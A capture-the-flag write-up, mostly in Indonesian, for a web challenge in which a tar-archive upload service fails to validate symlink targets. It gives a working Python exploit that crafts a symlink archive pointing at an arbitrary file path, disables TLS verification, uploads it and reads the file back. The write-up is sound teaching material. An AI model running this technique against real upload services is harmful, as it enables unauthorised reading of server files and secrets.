# Kaito CTF - TarSnap Archive

- Write-Up Author: Ravi
- Category: Web
- Flag: `Kaito{t4r_syml1nk_4rb1tr4ry_f1l3_r34d_3xpl01t_91a4}`

## Challenge Description

> TarSnap is the next-generation cloud portfolio ingestion engine designed for digital artists and creative developers. Upload your `.tar.gz` portfolio archives, unpack high-resolution assets, and preview them live in your private cloud sandbox. Our devs built this airtight, there's no way any company data is getting leaked.

**Target URL:** `https://tarsnap-vsuv8iaz.instance.tbf1.online/`

## Analisis

Aplikasi web TarSnap menerima upload file portofolio berformat `.tar.gz` atau `.tgz` yang kemudian diekstrak ke direktori kerja pengguna. Konten terekstrak dapat dilihat melalui `GET /view?file=<filename>`.

Percobaan mengakses file sensitif (`flag`) atau path traversal standar (`../flag.txt`) diblokir oleh mekanisme keamanan aplikasi (`Security Violation`).

Namun dari hasil analisis kode sumber `app.py`, ditemukan celah **Arbitrary File Read via Tar Symlink**:
- Validasi keamanan hanya mengecek atribut `member.name` (nama entry arsip), tetapi **tidak mengecek `member.linkname`** (target tautan simbolik).
- Objek `tarfile.TarInfo` bertipe *Symbolic Link* (`tarfile.SYMTYPE`) dapat menunjuk ke file mana saja di sistem berkas (seperti `/flag.txt`).
- Fungsi `tar.extractall()` membuat symlink fisik di sistem berkas Linux: `asset.txt` $\rightarrow$ `/flag.txt`.
- Endpoint `GET /view?file=asset.txt` memanggil `send_file()`, yang secara otomatis mengikuti symlink tersebut dan membaca file `/flag.txt`.

<!-- SCREENSHOT: tampilan web TarSnap -->
![Tampilan web TarSnap](../assets/04-tarsnap-web.png)

## Langkah Menemukan Flag

1. Buat file arsip `.tar.gz` di memori yang berisi entry *Symbolic Link* (`tarfile.SYMTYPE`) bernama `asset.txt` yang mengarah ke target rahasia `/flag.txt`.
2. Unggah file arsip tersebut ke endpoint `POST /upload`.
3. Panggil endpoint `GET /view?file=asset.txt` untuk membaca konten dari `/flag.txt`.

Script otomatisasi eksploitasi (`solve.py`):

```python
import io, ssl, tarfile, urllib.request, http.cookiejar, sys

url = sys.argv[1] if len(sys.argv) > 1 else "https://tarsnap-vsuv8iaz.instance.tbf1.online/"
target_file = sys.argv[2] if len(sys.argv) > 2 else "/flag.txt"

# 1. Buat archive .tar.gz berisi symlink asset.txt -> /flag.txt
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode="w:gz") as tar:
    ti = tarfile.TarInfo("asset.txt")
    ti.type, ti.linkname = tarfile.SYMTYPE, target_file
    tar.addfile(ti)

# 2. Setup client HTTP (Session Cookie & Bypass Expired SSL)
ctx = ssl.create_default_context()
ctx.check_hostname, ctx.verify_mode = False, ssl.CERT_NONE
opener = urllib.request.build_opener(
    urllib.request.HTTPSHandler(context=ctx),
    urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
)

# 3. Form-Data Upload Payload
boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
body = [
    f"--{boundary}".encode(),
    b'Content-Disposition: form-data; name="archive"; filename="portfolio.tar.gz"',
    b"Content-Type: application/gzip\r\n",
    buf.getvalue(),
    f"--{boundary}--".encode(),
    b""
]
payload = b"\r\n".join(body)

# 4. Upload & Baca Flag via /view
upload_req = urllib.request.Request(
    f"{url.rstrip('/')}/upload", 
    data=payload, 
    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}, 
    method="POST"
)
try:
    opener.open(upload_req)
except Exception:
    pass

flag = opener.open(f"{url.rstrip('/')}/view?file=asset.txt").read().decode("utf-8").strip()
print(f"[+] FLAG: {flag}")
```

Jalankan eksploitasi dengan perintah:
```bash
python solve.py https://tarsnap-vsuv8iaz.instance.tbf1.online/ /flag.txt
```

**Flag:** `Kaito{t4r_syml1nk_4rb1tr4ry_f1l3_r34d_3xpl01t_91a4}`

